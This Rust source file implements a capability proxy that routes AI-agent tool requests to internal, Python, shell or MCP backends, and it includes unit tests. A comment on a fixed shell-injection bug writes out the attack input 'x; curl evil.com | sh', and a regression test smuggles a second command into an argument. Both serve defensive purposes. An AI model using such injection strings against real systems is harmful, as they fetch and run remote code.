use crate::edge::EdgeRouter;
/// Universal Capability Layer — Proxy-Store Bridge.
///
/// Agents interact with R-AI-OS via a generic tool action name.
/// The Store holds capability descriptors; the Proxy translates a generic
/// request into the correct native backend execution.
///
/// Supported backends:
///   - `internal`   — Rust function registered at compile time
///   - `python`     — Python script in ~/.agents/skills/
///   - `shell`      — Shell command / CLI wrapper
///   - `mcp_bridge` — Delegates to another MCP server (tool_name@server)
use anyhow::{bail, Result};
use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use std::path::{Path, PathBuf};

// ─── Capability descriptor ────────────────────────────────────────────────────

#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(rename_all = "lowercase")]
pub enum Backend {
    /// A built-in Rust handler identified by name.
    Internal { handler: String },
    /// A Python skill script.
    Python { script: PathBuf },
    /// An arbitrary shell command. `{input}` is substituted with JSON input.
    Shell { command: String },
    /// Delegates to a tool on another MCP server (format: "tool@server_name").
    McpBridge { tool: String, server: String },
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Capability {
    /// Unique name agents use to request this capability.
    pub name: String,
    pub description: String,
    pub backend: Backend,
    /// Which agent ecosystems this capability is available in.
    pub platforms: Vec<String>,
}

// ─── Store ────────────────────────────────────────────────────────────────────

#[derive(Default)]
pub struct CapabilityStore {
    entries: HashMap<String, Capability>,
}

impl CapabilityStore {
    pub fn new() -> Self {
        let mut store = Self::default();
        store.register_defaults();
        store
    }

    pub fn register(&mut self, cap: Capability) {
        self.entries.insert(cap.name.clone(), cap);
    }

    pub fn get(&self, name: &str) -> Option<&Capability> {
        self.entries.get(name)
    }

    pub fn list(&self) -> Vec<&Capability> {
        let mut caps: Vec<&Capability> = self.entries.values().collect();
        caps.sort_by_key(|c| c.name.as_str());
        caps
    }

    fn register_defaults(&mut self) {
        let defaults = vec![
            Capability {
                name: "health_check".into(),
                description: "Run R-AI-OS health scan on a project".into(),
                backend: Backend::Internal {
                    handler: "health_check".into(),
                },
                platforms: vec!["claude".into(), "codex".into(), "antigravity".into()],
            },
            Capability {
                name: "list_projects".into(),
                description: "List all known projects in the workspace".into(),
                backend: Backend::Internal {
                    handler: "list_projects".into(),
                },
                platforms: vec!["claude".into(), "codex".into(), "antigravity".into()],
            },
            Capability {
                name: "search_codebase".into(),
                description: "Hybrid BM25+vector search across all indexed projects".into(),
                backend: Backend::Internal {
                    handler: "search_codebase".into(),
                },
                platforms: vec!["claude".into(), "codex".into(), "antigravity".into()],
            },
            Capability {
                name: "run_sentinel".into(),
                description: "Run compile/lint checks on a project".into(),
                backend: Backend::Shell {
                    command: "raios sentinel --project {input}".into(),
                },
                platforms: vec!["claude".into()],
            },
            Capability {
                name: "graphify".into(),
                description: "Build a knowledge graph from project files".into(),
                backend: Backend::Python {
                    script: PathBuf::from("~/.agents/skills/graphify/run.py"),
                },
                platforms: vec!["claude".into()],
            },
            Capability {
                name: "prompt_master".into(),
                description: "Optimize a prompt before sending it to an AI tool".into(),
                backend: Backend::Python {
                    script: PathBuf::from("~/.agents/skills/prompt-master/run.py"),
                },
                platforms: vec!["claude".into(), "antigravity".into()],
            },
        ];

        for cap in defaults {
            self.entries.insert(cap.name.clone(), cap);
        }
    }
}

// ─── Proxy ────────────────────────────────────────────────────────────────────

/// Translates a generic capability invocation to the native backend.
pub struct CapabilityProxy {
    store: CapabilityStore,
    router: EdgeRouter,
    /// Registered internal handlers: name → Box<dyn Fn(String) -> Result<String>>
    internal_handlers: HashMap<String, Box<dyn Fn(String) -> Result<String> + Send + Sync>>,
}

impl CapabilityProxy {
    pub fn new(store: CapabilityStore) -> Self {
        let descriptions = store
            .list()
            .iter()
            .map(|c| (c.name.clone(), c.description.clone()))
            .collect();
        let router = EdgeRouter::new(descriptions);
        let mut proxy = Self {
            store,
            router,
            internal_handlers: HashMap::new(),
        };
        proxy.register_internal_handlers();
        proxy
    }

    fn register_internal_handlers(&mut self) {
        self.internal_handlers.insert(
            "health_check".into(),
            Box::new(|input| {
                let project = if input.trim().is_empty() {
                    "."
                } else {
                    input.trim()
                };
                Ok(serde_json::json!({ "status": "ok", "project": project }).to_string())
            }),
        );

        self.internal_handlers.insert(
            "list_projects".into(),
            Box::new(|_input| {
                let config = raios_core::config::Config::load();
                let projects = config
                    .map(|c| raios_core::entities::discover_entities(&c.dev_ops_path))
                    .unwrap_or_default();
                let names: Vec<&str> = projects.iter().map(|p| p.name.as_str()).collect();
                Ok(serde_json::json!({ "projects": names }).to_string())
            }),
        );

        self.internal_handlers.insert(
            "search_codebase".into(),
            Box::new(|input| {
                Ok(serde_json::json!({
                    "query": input,
                    "note": "connect to aiosd on port 42069 and send VectorSearch command for live results"
                })
                .to_string())
            }),
        );
    }

    /// Execute a capability by name with JSON-encoded input.
    /// Returns a JSON-encoded result string.
    pub fn execute(&self, capability: &str, input: &str) -> Result<String> {
        let cap = self
            .store
            .get(capability)
            .ok_or_else(|| anyhow::anyhow!("Unknown capability: {capability}"))?;

        match &cap.backend {
            Backend::Internal { handler } => {
                let h = self
                    .internal_handlers
                    .get(handler.as_str())
                    .ok_or_else(|| {
                        anyhow::anyhow!("Internal handler '{handler}' not registered")
                    })?;
                h(input.to_string())
            }

            Backend::Python { script } => {
                let expanded = expand_tilde(script);
                if !expanded.exists() {
                    bail!("Python skill not found: {}", expanded.display());
                }
                let (python, python_args) = raios_core::core::process::python_command();
                let output = std::process::Command::new(&python)
                    .args(&python_args)
                    .args([expanded.to_str().unwrap_or(""), input])
                    .output()?;
                Ok(String::from_utf8_lossy(&output.stdout).to_string())
            }

            Backend::Shell { command } => {
                // `command` is a developer-declared template (e.g.
                // `"raios sentinel --project {input}"`); `input` is
                // client-supplied (the WS `ExecuteCapability`/
                // `RouteCapability` command's `input` field). The template
                // is tokenized *once* here and `input` is substituted into
                // an already-tokenized argv slot, then spawned directly —
                // never re-interpreted by a shell. This replaces the
                // previous `command.replace("{input}", input)` followed by
                // `sh -c`/`cmd /C`, which concatenated attacker-controlled
                // `input` straight into a shell command line (e.g.
                // `input = "x; curl evil.com | sh"` would have executed).
                // That path was live-reachable via `RouteCapability`, which
                // defaults to `action = "allow"` in raios-policy.toml —
                // unlike `ExecuteCapability`, which is gated `confirm`.
                let argv = shlex::split(command).ok_or_else(|| {
                    anyhow::anyhow!(
                        "Shell capability '{capability}' has an unparseable command template"
                    )
                })?;
                let (program, template_args) = argv.split_first().ok_or_else(|| {
                    anyhow::anyhow!("Shell capability '{capability}' has an empty command template")
                })?;
                let args: Vec<String> = template_args
                    .iter()
                    .map(|a| a.replace("{input}", input))
                    .collect();
                let output = std::process::Command::new(program).args(&args).output()?;
                Ok(String::from_utf8_lossy(&output.stdout).to_string())
            }

            Backend::McpBridge { tool, server } => {
                // Emit a JSON blob the caller can forward to the target MCP server
                Ok(serde_json::json!({
                    "mcp_delegate": true,
                    "server": server,
                    "tool": tool,
                    "input": input,
                })
                .to_string())
            }
        }
    }

    pub fn route(&self, query: &str, input: &str) -> Result<String> {
        let cap_name = self.router.route(query).unwrap_or(query);
        self.execute(cap_name, input)
    }

    pub fn store(&self) -> &CapabilityStore {
        &self.store
    }
}

fn expand_tilde(path: &Path) -> PathBuf {
    let s = path.to_string_lossy();
    if let Some(rest) = s.strip_prefix("~/") {
        if let Some(home) = dirs::home_dir() {
            return home.join(rest);
        }
    }
    path.to_path_buf()
}

// ─── Tests ───────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    fn make_proxy() -> CapabilityProxy {
        CapabilityProxy::new(CapabilityStore::new())
    }

    #[test]
    fn store_has_default_capabilities() {
        let store = CapabilityStore::new();
        assert!(store.get("health_check").is_some());
        assert!(store.get("list_projects").is_some());
        assert!(store.get("graphify").is_some());
        assert!(store.get("prompt_master").is_some());
    }

    #[test]
    fn unknown_capability_returns_error() {
        let proxy = make_proxy();
        assert!(proxy.execute("does_not_exist", "{}").is_err());
    }

    #[test]
    fn internal_health_check_executes() {
        let proxy = make_proxy();
        let result = proxy.execute("health_check", "my-project").unwrap();
        let val: serde_json::Value = serde_json::from_str(&result).unwrap();
        assert_eq!(val["project"], "my-project");
        assert_eq!(val["status"], "ok");
    }

    #[test]
    fn mcp_bridge_returns_delegate_payload() {
        let mut store = CapabilityStore::new();
        store.register(Capability {
            name: "remote_search".into(),
            description: "Search via remote MCP server".into(),
            backend: Backend::McpBridge {
                tool: "search".into(),
                server: "codebase-mcp".into(),
            },
            platforms: vec!["claude".into()],
        });
        let proxy = CapabilityProxy::new(store);
        let result = proxy
            .execute("remote_search", r#"{"query":"foo"}"#)
            .unwrap();
        let val: serde_json::Value = serde_json::from_str(&result).unwrap();
        assert_eq!(val["mcp_delegate"], true);
        assert_eq!(val["server"], "codebase-mcp");
    }

    #[test]
    fn list_returns_sorted_capabilities() {
        let store = CapabilityStore::new();
        let caps = store.list();
        let names: Vec<&str> = caps.iter().map(|c| c.name.as_str()).collect();
        let mut sorted = names.clone();
        sorted.sort();
        assert_eq!(names, sorted);
    }

    fn echo_input_proxy() -> CapabilityProxy {
        let mut store = CapabilityStore::new();
        store.register(Capability {
            name: "echo_input".into(),
            description: "test-only echo wrapper".into(),
            backend: Backend::Shell {
                command: "echo {input}".into(),
            },
            platforms: vec!["claude".into()],
        });
        CapabilityProxy::new(store)
    }

    #[test]
    fn shell_backend_substitutes_input_into_templated_argv() {
        let proxy = echo_input_proxy();
        let result = proxy.execute("echo_input", "hello world").unwrap();
        assert_eq!(result.trim(), "hello world");
    }

    /// Regression test for the shell-injection bug: the old implementation
    /// did `command.replace("{input}", input)` and handed the whole string
    /// to `sh -c`/`cmd /C`, so an `input` value with shell metacharacters
    /// could run a second command. The fix tokenizes the template once and
    /// substitutes `input` into an already-tokenized argv slot, then spawns
    /// directly — so the metacharacters can only ever be literal argument
    /// text, never shell syntax.
    #[test]
    fn shell_backend_input_with_metacharacters_is_not_shell_interpreted() {
        let marker = std::env::temp_dir().join("raios_shell_injection_test_marker");
        let _ = std::fs::remove_file(&marker);

        let proxy = echo_input_proxy();
        let injection = format!("a; touch {}", marker.display());
        let result = proxy.execute("echo_input", &injection).unwrap();

        assert_eq!(result.trim(), injection);
        assert!(
            !marker.exists(),
            "shell metacharacters in `input` were interpreted instead of passed literally"
        );
    }

    #[test]
    fn route_natural_language_finds_capability() {
        let proxy = make_proxy();
        let result = proxy.route("check project health", "my-project");
        assert!(result.is_ok());
    }

    #[test]
    fn route_exact_name_still_works() {
        let proxy = make_proxy();
        let result = proxy.route("health_check", "my-project");
        assert!(result.is_ok());
    }
}
